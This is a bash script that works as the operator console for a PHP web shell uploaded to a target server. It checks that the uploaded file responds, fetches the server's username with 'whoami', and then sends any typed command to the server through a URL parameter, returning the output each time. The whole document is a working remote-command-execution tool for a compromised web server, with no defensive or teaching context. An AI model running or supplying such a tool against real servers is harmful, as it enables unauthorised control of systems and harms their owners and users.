#!/bin/bash
url=${1%%\?*}
if [[ -z $url ]]
then
    echo 'usage: url: you must specify the url with the file uploaded'
    exit 1
fi

test=$(curl --silent "$url")
if [[ $test != 'done' ]]
then
    echo 'ERROR: target server is not running the uploaded php file'
    echo '(Maybe you wrote a wrong path)'
    exit 1
fi

# get server username
usr=$(curl --silent -G --data-urlencode "s=whoami" $url)

# show console
echo 'Starting console:'
while [[ 1 = 1 ]]
do
    read -p "$usr:$ " cmd
    if [[ $cmd = 'exit' ]]
    then
        exit 0
    fi
    curl -G --data-urlencode "s=$cmd" "$url"
done
